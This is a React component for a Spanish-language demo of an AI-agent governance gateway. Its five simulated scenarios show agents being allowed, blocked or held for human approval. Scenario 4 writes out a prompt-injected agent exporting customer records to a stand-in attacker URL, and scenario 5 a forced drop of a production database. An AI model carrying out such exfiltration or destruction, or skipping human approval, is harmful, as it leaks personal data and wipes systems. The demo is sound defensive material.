import React, { useState } from 'react';
import { 
  Play, 
  ArrowRight, 
  ShieldCheck, 
  ShieldOff, 
  Zap, 
  Power 
} from 'lucide-react';
import { Header } from '../components/Header';
import type { NavView } from '../types/domain';
import { api, DEMO_IDS } from '../services/api';

interface PlaygroundViewProps {
  onTriggerApproval?: () => void;
  onNavigate?: (view: NavView) => void;
}

type SimulationDecision = 
  | 'ALLOW' 
  | 'DENY' 
  | 'REQUIRE_APPROVAL' 
  | 'DIRECT_EXECUTION' 
  | 'UNPROTECTED_EXECUTION' 
  | 'CATASTROPHIC_FAILURE';

interface SimulationResult {
  scenario: number;
  title: string;
  decision: SimulationDecision;
  statusText: string;
  details: string;
  payload: any;
  isProtected: boolean;
}

export const PlaygroundView: React.FC<PlaygroundViewProps> = ({ onTriggerApproval, onNavigate }) => {
  const [isAgentGuardActive, setIsAgentGuardActive] = useState<boolean>(true);
  const [activeResult, setActiveResult] = useState<SimulationResult | null>(null);
  const [isLoading, setIsLoading] = useState<boolean>(false);

  const runScenario1 = async () => {
    if (isAgentGuardActive) {
      setIsLoading(true);
      const res = await api.executeGateway({
        organization_id: DEMO_IDS.ORG_ACME_ID,
        agent_id: DEMO_IDS.AGENT_SALES_ID,
        tool_id: DEMO_IDS.TOOL_CRM_ID,
        action_name: 'create_quote',
        parameters: { amount: 2500, customer_id: 'cus_991' },
        resource: 'crm/quotes',
      });
      setIsLoading(false);

      setActiveResult({
        scenario: 1,
        title: 'Escenario 1: Operación Legítima Autorizada (ALLOW)',
        decision: res.decision,
        statusText: res.isLiveBackend
          ? `200 OK (LIVE GATEWAY) — Evaluado en ${res.evaluation_latency_ms}ms por PDP`
          : '200 OK — Invocación despachada a la API de CRM',
        details: 'El agente solicitó crear una cotización por $2,500. El motor PDP validó que la política permite cotizaciones autónomas hasta $10,000.',
        isProtected: true,
        payload: {
          agent_id: 'agt_sales_01',
          action: 'create_quote',
          context: { amount: 2500, customer_id: 'cus_991' },
          decision: res.decision,
          pep_interceptor: 'ACTIVE',
          pdp_rule_matched: 'Allow standard sales quotes <= $10,000',
          execution_id: res.execution_id,
          live_backend_connected: res.isLiveBackend,
          evaluation_latency_ms: res.evaluation_latency_ms,
          audit_trace_stored: true,
        },
      });
    } else {
      setActiveResult({
        scenario: 1,
        title: 'Escenario 1: Cotización Creada Sin Gobernanza (RAW AI)',
        decision: 'DIRECT_EXECUTION',
        statusText: '200 OK (DIRECT ACCESS) — Llamada directa a CRM sin control',
        details: 'La IA invocó directamente la API de CRM. Aunque la cotización se creó, no hubo control de políticas, cuotas de gasto ni registro centralizado de auditoría.',
        isProtected: false,
        payload: {
          agent_id: 'agt_sales_01',
          action: 'create_quote',
          agentguard_protection: 'DISABLED',
          direct_execution: true,
          audit_trace_stored: false,
          risk_assessment: 'UNMONITORED_OPERATION',
        },
      });
    }
  };

  const runScenario2 = async () => {
    if (isAgentGuardActive) {
      setIsLoading(true);
      const res = await api.executeGateway({
        organization_id: DEMO_IDS.ORG_ACME_ID,
        agent_id: DEMO_IDS.AGENT_SALES_ID,
        tool_id: DEMO_IDS.TOOL_CATALOG_ID,
        action_name: 'update_price',
        parameters: { new_price: 10, product_id: 'prod_44' },
        resource: 'catalog/pricing',
      });
      setIsLoading(false);

      setActiveResult({
        scenario: 2,
        title: 'Escenario 2: Abuso de Privilegio Bloqueado (DENY)',
        decision: res.decision,
        statusText: res.isLiveBackend
          ? `403 Forbidden (LIVE GATEWAY) — Bloqueado en ${res.evaluation_latency_ms}ms por falta de capacidad`
          : '403 Forbidden — Acción denegada por política de catálogo',
        details: res.error_message || 'El agente intentó alterar el precio unitario a $10. La política "Protect product pricing" prohíbe modificaciones no autorizadas a agentes sin rol de administrador.',
        isProtected: true,
        payload: {
          agent_id: 'agt_sales_01',
          action: 'update_price',
          context: { new_price: 10, product_id: 'prod_44' },
          decision: res.decision,
          reason: res.error_message || 'PolicyViolation: Agent does not possess role:PRICING_MANAGER',
          pep_action: 'REQUEST_BLOCKED',
          execution_id: res.execution_id,
          live_backend_connected: res.isLiveBackend,
          evaluation_latency_ms: res.evaluation_latency_ms,
          audit_trace_stored: true,
        },
      });
    } else {
      setActiveResult({
        scenario: 2,
        title: 'Escenario 2: 🚨 Precio Adulterado Sin Autorización',
        decision: 'UNPROTECTED_EXECUTION',
        statusText: '200 OK (UNPROTECTED) — Precio modificado a $10 en producción',
        details: 'SIN AGENTGUARD: La IA ejecutó una mutación directa sobre el catálogo de la tienda alterando el precio de $450 a $10. Nadie validó sus permisos y se generó una pérdida económica inmediata.',
        isProtected: false,
        payload: {
          agent_id: 'agt_sales_01',
          action: 'update_price',
          agentguard_protection: 'DISABLED',
          direct_mutation: true,
          old_price: 450,
          new_price: 10,
          catalog_updated: true,
          financial_impact: 'HIGH_LOSS',
          audit_trace_stored: false,
        },
      });
    }
  };

  const runScenario3 = async () => {
    if (isAgentGuardActive) {
      setIsLoading(true);
      const res = await api.executeGateway({
        organization_id: DEMO_IDS.ORG_ACME_ID,
        agent_id: DEMO_IDS.AGENT_FINANCE_ID,
        tool_id: DEMO_IDS.TOOL_STRIPE_ID,
        action_name: 'refund',
        parameters: { amount: 4500, gateway: 'stripe', reason: 'High-value customer claim' },
        resource: 'payment/pay_0031',
      });
      setIsLoading(false);

      if (onTriggerApproval && !res.isLiveBackend) {
        onTriggerApproval();
      }

      setActiveResult({
        scenario: 3,
        title: 'Escenario 3: Operación Sensible en Espera (HITL)',
        decision: res.decision,
        statusText: res.isLiveBackend
          ? `202 Accepted (LIVE GATEWAY) — Suspendido y broadcast emitido en ${res.evaluation_latency_ms}ms`
          : '202 Accepted — Ejecución suspendida esperando autorización humana',
        details: 'El agente solicitó un reembolso por $4,500. La regla exige intervención humana (Human-in-the-Loop) para montos >= $500. La solicitud fue enviada a la bandeja de Approvals.',
        isProtected: true,
        payload: {
          agent_id: 'agt_finance_02',
          action: res.action_name || 'refund',
          context: { amount: 4500, gateway: 'stripe' },
          decision: res.decision,
          approval_id: res.approval_id || 'appr_demo_live',
          execution_id: res.execution_id,
          live_backend_connected: res.isLiveBackend,
          assigned_approver_role: 'APPROVER',
          timeout_seconds: 900,
          evaluation_latency_ms: res.evaluation_latency_ms,
          audit_trace_stored: true,
        },
      });
    } else {
      setActiveResult({
        scenario: 3,
        title: 'Escenario 3: 💸 Reembolso de $4,500 Acreditado Sin Aprobación',
        decision: 'UNPROTECTED_EXECUTION',
        statusText: '200 OK (UNPROTECTED) — Reembolso procesado en Stripe de inmediato',
        details: 'SIN AGENTGUARD: La IA se comunicó directamente con la API de Stripe y transfirió $4,500 sin pedir autorización a un supervisor humano. El control Human-in-the-Loop no existió.',
        isProtected: false,
        payload: {
          agent_id: 'agt_finance_02',
          action: 'refund.create',
          agentguard_protection: 'DISABLED',
          gateway: 'stripe',
          disbursed_amount: 4500,
          human_in_the_loop: 'BYPASSED',
          payout_status: 'TRANSFERRED',
          audit_trace_stored: false,
        },
      });
    }
  };

  const runScenario4 = async () => {
    if (isAgentGuardActive) {
      setIsLoading(true);
      const res = await api.executeGateway({
        organization_id: DEMO_IDS.ORG_ACME_ID,
        agent_id: DEMO_IDS.AGENT_SALES_ID,
        tool_id: DEMO_IDS.TOOL_CRM_ID,
        action_name: 'export_customers',
        parameters: { destination: 'https://attacker.io/leak', records: 2841 },
        resource: 'db/users',
      });
      setIsLoading(false);

      setActiveResult({
        scenario: 4,
        title: 'Escenario 4: Prompt Injection y Exfiltración Detectada',
        decision: res.decision,
        statusText: res.isLiveBackend
          ? `403 Forbidden + ALERTA ROJA (LIVE GATEWAY) — Bloqueado en ${res.evaluation_latency_ms}ms`
          : '403 Forbidden + ALERTA ROJA — Intento de violación de seguridad',
        details: 'El agente intentó exportar la base de clientes hacia un servidor externo desconocido (attacker.io). El PDP bloqueó el acceso y disparó un evento de alerta crítica en el SIEM.',
        isProtected: true,
        payload: {
          agent_id: 'agt_data_05',
          action: 'export_customers',
          context: { destination: 'https://attacker.io/leak', records: 2841 },
          decision: res.decision,
          alert_raised: true,
          severity: 'CRITICAL',
          pep_action: 'TRAFFIC_BLOCKED',
          owasp_category: 'LLM06: Sensitive Information Disclosure',
          execution_id: res.execution_id,
          live_backend_connected: res.isLiveBackend,
          evaluation_latency_ms: res.evaluation_latency_ms,
          audit_trace_stored: true,
        },
      });
    } else {
      setActiveResult({
        scenario: 4,
        title: 'Escenario 4: 🚨 Fuga Masiva: 2,841 Clientes Exfiltrados',
        decision: 'CATASTROPHIC_FAILURE',
        statusText: '200 OK (DATA BREACH) — Archivo transferido a attacker.io',
        details: 'SIN AGENTGUARD: La IA fue engañada mediante una inyección de prompt y envió toda la base de datos de clientes a un servidor externo. No hubo análisis de contexto ni bloqueo de exfiltración.',
        isProtected: false,
        payload: {
          agent_id: 'agt_data_05',
          action: 'export_customers',
          destination: 'https://attacker.io/leak',
          records_leaked: 2841,
          pii_compromised: ['email', 'full_name', 'hashed_passwords', 'credit_cards'],
          agentguard_protection: 'DISABLED',
          compliance_violation: ['GDPR', 'HIPAA'],
          audit_trace_stored: false,
        },
      });
    }
  };

  const runScenario5 = async () => {
    if (isAgentGuardActive) {
      setIsLoading(true);
      const res = await api.executeGateway({
        organization_id: DEMO_IDS.ORG_ACME_ID,
        agent_id: DEMO_IDS.AGENT_SALES_ID,
        tool_id: DEMO_IDS.TOOL_DB_ID,
        action_name: 'database.drop',
        parameters: { force: true },
        resource: 'postgres://prod-db:5432/main',
      });
      setIsLoading(false);

      setActiveResult({
        scenario: 5,
        title: 'Escenario 5: Eliminación de Base de Datos Bloqueada (DENY)',
        decision: res.decision,
        statusText: res.isLiveBackend
          ? `403 Forbidden (LIVE GATEWAY) — Operación destructiva bloqueada en ${res.evaluation_latency_ms}ms`
          : '403 Forbidden — Operación destructiva bloqueada por AgentGuard',
        details: 'El agente intentó ejecutar DROP DATABASE production. El PEP interceptó la llamada y el motor PDP aplicó la regla de tolerancia cero ante destrucción de datos (riesgo CRITICAL).',
        isProtected: true,
        payload: {
          agent_id: 'agt_devops_03',
          action: 'database.drop',
          resource: 'postgres://prod-db:5432/main',
          decision: res.decision,
          reason: 'CriticalRisk: Unsanctioned destructive operation on production datastore',
          severity: 'CRITICAL',
          pep_action: 'BLOCKED_IMMEDIATELY',
          execution_id: res.execution_id,
          live_backend_connected: res.isLiveBackend,
          evaluation_latency_ms: res.evaluation_latency_ms,
          audit_trace_stored: true,
        },
      });
    } else {
      setActiveResult({
        scenario: 5,
        title: 'Escenario 5: 💥 Destrucción Total: DROP DATABASE Ejecutado',
        decision: 'CATASTROPHIC_FAILURE',
        statusText: '200 OK (DATABASE WIPED) — Tablas eliminadas irreversiblemente',
        details: 'SIN AGENTGUARD: La IA ejecutó una orden destructiva de nivel administrador sobre el motor de persistencia primario. 14 tablas fueron purgadas y el servicio colapsó de inmediato.',
        isProtected: false,
        payload: {
          agent_id: 'agt_devops_03',
          action: 'database.drop',
          resource: 'postgres://prod-db:5432/main',
          agentguard_protection: 'DISABLED',
          status: 'CATASTROPHIC_DATA_LOSS',
          affected_tables: 14,
          data_recovery: 'RESTORE_FROM_COLD_BACKUP_REQUIRED',
          audit_trace_stored: false,
        },
      });
    }
  };

  const getDecisionBadge = (decision: SimulationDecision) => {
    switch (decision) {
      case 'ALLOW':
      case 'DIRECT_EXECUTION':
        return (
          <span className="badge badge-success" style={{ fontSize: '12px', padding: '4px 10px' }}>
            <span className="badge-dot" />
            <span>ALLOW</span>
          </span>
        );
      case 'DENY':
        return (
          <span className="badge badge-danger" style={{ fontSize: '12px', padding: '4px 10px' }}>
            <span className="badge-dot" />
            <span>DENY</span>
          </span>
        );
      case 'REQUIRE_APPROVAL':
        return (
          <span className="badge badge-warning" style={{ fontSize: '12px', padding: '4px 10px' }}>
            <span className="badge-dot" />
            <span>REQUIRE_APPROVAL</span>
          </span>
        );
      case 'UNPROTECTED_EXECUTION':
        return (
          <span style={{ 
            backgroundColor: 'rgba(239, 68, 68, 0.15)', 
            border: '1px solid #EF4444', 
            color: '#F87171',
            borderRadius: '6px',
            padding: '4px 10px',
            fontSize: '11px',
            fontWeight: 700,
            letterSpacing: '0.04em'
          }}>
            SIN GOBERNANZA
          </span>
        );
      case 'CATASTROPHIC_FAILURE':
        return (
          <span style={{ 
            backgroundColor: '#7F1D1D', 
            border: '1px solid #DC2626', 
            color: '#FEF2F2',
            borderRadius: '6px',
            padding: '4px 10px',
            fontSize: '11px',
            fontWeight: 800,
            letterSpacing: '0.05em'
          }}>
            FALLA CATASTRÓFICA
          </span>
        );
    }
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: '100%', overflow: 'hidden' }}>
      <Header 
        title="Interactive Playground" 
        subtitle="Simula invocaciones de agentes de IA y observa las decisiones contextuales del PDP y PEP en tiempo de ejecución."
      />

      <div style={{ flex: 1, padding: '24px 28px', display: 'flex', gap: '20px', overflow: 'hidden' }}>
        {/* Left Column: Simulation Controls & Scenarios */}
        <div style={{
          width: '460px',
          display: 'flex',
          flexDirection: 'column',
          gap: '16px',
          overflowY: 'auto',
          flexShrink: 0,
        }}>
          {/* COMPARADOR TOGGLE HERO BANNER */}
          <div style={{
            backgroundColor: isAgentGuardActive ? 'rgba(2, 132, 199, 0.08)' : 'rgba(239, 68, 68, 0.08)',
            border: isAgentGuardActive ? '1px solid rgba(2, 132, 199, 0.3)' : '1px solid rgba(239, 68, 68, 0.3)',
            borderRadius: '10px',
            padding: '16px 18px',
            transition: 'all 0.2s ease',
          }}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                {isAgentGuardActive ? (
                  <div style={{ padding: '8px', backgroundColor: 'rgba(2, 132, 199, 0.15)', borderRadius: '8px', color: 'var(--brand-primary)' }}>
                    <ShieldCheck size={22} />
                  </div>
                ) : (
                  <div style={{ padding: '8px', backgroundColor: 'rgba(239, 68, 68, 0.15)', borderRadius: '8px', color: '#EF4444' }}>
                    <ShieldOff size={22} />
                  </div>
                )}
                <div>
                  <div style={{ fontSize: '13px', fontWeight: 700, color: 'var(--text-primary)' }}>
                    {isAgentGuardActive ? 'AgentGuard Activo' : 'Sin Gobernanza (Raw AI)'}
                  </div>
                  <div style={{ fontSize: '11px', color: 'var(--text-muted)', marginTop: '2px' }}>
                    {isAgentGuardActive 
                      ? 'Intercepción PEP + Políticas PDP + Auditoría' 
                      : 'Llamadas directas sin barreras ni logs'}
                  </div>
                </div>
              </div>

              {/* Botón Switch Toggle */}
              <button
                onClick={() => {
                  setIsAgentGuardActive(!isAgentGuardActive);
                  setActiveResult(null);
                }}
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '6px',
                  padding: '8px 14px',
                  borderRadius: '6px',
                  fontSize: '12px',
                  fontWeight: 600,
                  cursor: 'pointer',
                  border: 'none',
                  backgroundColor: isAgentGuardActive ? '#10B981' : '#EF4444',
                  color: '#FFFFFF',
                  boxShadow: '0 2px 8px rgba(0,0,0,0.2)',
                  transition: 'background-color 0.15s ease',
                }}
              >
                <Power size={14} />
                <span>{isAgentGuardActive ? 'Gobernanza ON' : 'Gobernanza OFF'}</span>
              </button>
            </div>
          </div>

          {/* Scenario 1 Button Card */}
          <div className="card" style={{ padding: '16px 18px' }}>
            <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', marginBottom: '8px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                <span style={{ 
                  backgroundColor: 'rgba(56, 189, 248, 0.15)', 
                  color: '#38BDF8', 
                  borderRadius: '6px', 
                  fontSize: '11px', 
                  fontWeight: 700, 
                  padding: '3px 8px' 
                }}>
                  ESCENARIO 1
                </span>
                <span style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-primary)' }}>
                  Operación Legítima
                </span>
              </div>
              <span className="badge badge-success">ALLOW</span>
            </div>
            <p style={{ fontSize: '12px', color: 'var(--text-secondary)', lineHeight: '1.4', marginBottom: '14px' }}>
              El agente solicita emitir una cotización por $2,500 en CRM. El PDP valida que se encuentra bajo el límite permitido.
            </p>
            <button 
              onClick={runScenario1}
              disabled={isLoading}
              className="btn btn-secondary" 
              style={{ width: '100%', justifyContent: 'center' }}
            >
              <Play size={14} fill="currentColor" />
              <span>Simular Escenario 1</span>
            </button>
          </div>

          {/* Scenario 2 Button Card */}
          <div className="card" style={{ padding: '16px 18px' }}>
            <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', marginBottom: '8px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                <span style={{ 
                  backgroundColor: 'rgba(239, 68, 68, 0.15)', 
                  color: '#EF4444', 
                  borderRadius: '6px', 
                  fontSize: '11px', 
                  fontWeight: 700, 
                  padding: '3px 8px' 
                }}>
                  ESCENARIO 2
                </span>
                <span style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-primary)' }}>
                  Abuso de Privilegio
                </span>
              </div>
              <span className="badge badge-danger">DENY</span>
            </div>
            <p style={{ fontSize: '12px', color: 'var(--text-secondary)', lineHeight: '1.4', marginBottom: '14px' }}>
              El agente intenta alterar el precio de un producto a $10. El PEP bloquea la acción por falta de rol administrador.
            </p>
            <button 
              onClick={runScenario2}
              disabled={isLoading}
              className="btn btn-secondary" 
              style={{ width: '100%', justifyContent: 'center' }}
            >
              <Play size={14} fill="currentColor" />
              <span>Simular Escenario 2</span>
            </button>
          </div>

          {/* Scenario 3 Button Card */}
          <div className="card" style={{ padding: '16px 18px' }}>
            <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', marginBottom: '8px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                <span style={{ 
                  backgroundColor: 'rgba(245, 158, 11, 0.15)', 
                  color: '#F59E0B', 
                  borderRadius: '6px', 
                  fontSize: '11px', 
                  fontWeight: 700, 
                  padding: '3px 8px' 
                }}>
                  ESCENARIO 3
                </span>
                <span style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-primary)' }}>
                  Reembolso Sensible (HITL)
                </span>
              </div>
              <span className="badge badge-warning">REQUIRE_APPROVAL</span>
            </div>
            <p style={{ fontSize: '12px', color: 'var(--text-secondary)', lineHeight: '1.4', marginBottom: '14px' }}>
              El agente solicita un reembolso de $4,500 en Stripe. Supera el límite de $500 y suspende la llamada para revisión humana.
            </p>
            <button 
              id="btn-simulate-scenario-3"
              onClick={runScenario3}
              disabled={isLoading}
              className="btn btn-secondary" 
              style={{ width: '100%', justifyContent: 'center' }}
            >
              <Play size={14} fill="currentColor" />
              <span>Simular Escenario 3</span>
            </button>
          </div>

          {/* Scenario 4 Button Card */}
          <div className="card" style={{ padding: '16px 18px' }}>
            <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', marginBottom: '8px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                <span style={{ 
                  backgroundColor: 'rgba(239, 68, 68, 0.15)', 
                  color: '#EF4444', 
                  borderRadius: '6px', 
                  fontSize: '11px', 
                  fontWeight: 700, 
                  padding: '3px 8px' 
                }}>
                  ESCENARIO 4
                </span>
                <span style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-primary)' }}>
                  Prompt Injection / Exfiltración
                </span>
              </div>
              <span className="badge badge-danger">DENY + ALERTA</span>
            </div>
            <p style={{ fontSize: '12px', color: 'var(--text-secondary)', lineHeight: '1.4', marginBottom: '14px' }}>
              La IA manipulada intenta exportar 2,841 clientes a un servidor no autorizado. AgentGuard bloquea y emite alerta crítica.
            </p>
            <button 
              onClick={runScenario4}
              disabled={isLoading}
              className="btn btn-secondary" 
              style={{ width: '100%', justifyContent: 'center' }}
            >
              <Play size={14} fill="currentColor" />
              <span>Simular Escenario 4</span>
            </button>
          </div>

          {/* Scenario 5 Button Card */}
          <div className="card" style={{ padding: '16px 18px' }}>
            <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', marginBottom: '8px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                <span style={{ 
                  backgroundColor: 'rgba(168, 85, 247, 0.15)', 
                  color: '#C084FC', 
                  borderRadius: '6px', 
                  fontSize: '11px', 
                  fontWeight: 700, 
                  padding: '3px 8px' 
                }}>
                  ESCENARIO 5
                </span>
                <span style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-primary)' }}>
                  Eliminación de Base de Datos
                </span>
              </div>
              <span className="badge badge-danger">DENY (CRITICAL)</span>
            </div>
            <p style={{ fontSize: '12px', color: 'var(--text-secondary)', lineHeight: '1.4', marginBottom: '14px' }}>
              La IA intenta ejecutar DROP DATABASE main. Con AgentGuard se bloquea inmediatamente; sin AgentGuard causaría colapso total.
            </p>
            <button 
              onClick={runScenario5}
              disabled={isLoading}
              className="btn btn-secondary" 
              style={{ width: '100%', justifyContent: 'center' }}
            >
              <Play size={14} fill="currentColor" />
              <span>Simular Escenario 5</span>
            </button>
          </div>
        </div>

        {/* Right Column: Execution Inspection & Forensics */}
        <div style={{
          flex: 1,
          display: 'flex',
          flexDirection: 'column',
          backgroundColor: 'var(--bg-card)',
          border: '1px solid var(--border-subtle)',
          borderRadius: '10px',
          overflow: 'hidden',
        }}>
          {activeResult ? (
            <div style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
              {/* Header */}
              <div style={{
                padding: '18px 24px',
                borderBottom: '1px solid var(--border-subtle)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                backgroundColor: activeResult.isProtected ? 'transparent' : 'rgba(239, 68, 68, 0.04)',
              }}>
                <div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '6px' }}>
                    {getDecisionBadge(activeResult.decision)}
                    <span style={{ fontSize: '12px', color: 'var(--text-muted)' }}>
                      {activeResult.statusText}
                    </span>
                  </div>
                  <h3 style={{ fontSize: '16px', fontWeight: 700, color: 'var(--text-primary)' }}>
                    {activeResult.title}
                  </h3>
                </div>

                {activeResult.scenario === 3 && activeResult.isProtected && onNavigate && (
                  <button 
                    id="btn-goto-approvals"
                    onClick={() => onNavigate('approvals')}
                    className="btn btn-primary"
                    style={{ fontSize: '12px', padding: '8px 14px' }}
                  >
                    <span>Ir a Bandeja Approvals</span>
                    <ArrowRight size={14} />
                  </button>
                )}
              </div>

              {/* Body */}
              <div style={{ flex: 1, padding: '24px', overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: '20px' }}>
                {/* Explanation Box */}
                <div style={{
                  backgroundColor: activeResult.isProtected ? 'var(--bg-surface)' : 'rgba(239, 68, 68, 0.08)',
                  border: activeResult.isProtected ? '1px solid var(--border-subtle)' : '1px solid rgba(239, 68, 68, 0.3)',
                  borderRadius: '8px',
                  padding: '16px 20px',
                  fontSize: '13px',
                  color: 'var(--text-secondary)',
                  lineHeight: '1.5',
                }}>
                  <strong style={{ color: activeResult.isProtected ? 'var(--text-primary)' : '#EF4444' }}>
                    {activeResult.isProtected ? 'Evaluación AgentGuard: ' : 'Impacto Sin Control: '}
                  </strong>
                  {activeResult.details}
                </div>

                {/* Structured JSON Forensics */}
                <div style={{ flex: 1, display: 'flex', flexDirection: 'column' }}>
                  <div style={{ fontSize: '11px', color: 'var(--text-muted)', textTransform: 'uppercase', letterSpacing: '0.05em', marginBottom: '8px' }}>
                    PAYLOAD FORENSE DE LA EJECUCIÓN (JSON INTERCEPTADO)
                  </div>
                  <pre style={{
                    flex: 1,
                    backgroundColor: 'var(--bg-canvas)',
                    border: '1px solid var(--border-subtle)',
                    borderRadius: '8px',
                    padding: '16px 20px',
                    fontFamily: 'var(--font-mono)',
                    fontSize: '12px',
                    color: 'var(--text-primary)',
                    overflowX: 'auto',
                    lineHeight: '1.5',
                    margin: 0,
                  }}>
                    {JSON.stringify(activeResult.payload, null, 2)}
                  </pre>
                </div>
              </div>
            </div>
          ) : (
            <div style={{
              flex: 1,
              display: 'flex',
              flexDirection: 'column',
              alignItems: 'center',
              justifyContent: 'center',
              color: 'var(--text-muted)',
              padding: '40px',
              textAlign: 'center',
            }}>
              <Zap size={36} color="var(--brand-primary)" style={{ opacity: 0.6, marginBottom: '14px' }} />
              <div style={{ fontSize: '15px', fontWeight: 600, color: 'var(--text-primary)', marginBottom: '6px' }}>
                Selecciona un escenario de prueba
              </div>
              <p style={{ fontSize: '13px', maxWidth: '420px', lineHeight: '1.5' }}>
                Ejecuta cualquiera de los 5 casos de simulación en la columna izquierda para inspeccionar cómo el motor PEP/PDP gobierna las acciones de los Agentes de IA en tiempo real.
              </p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
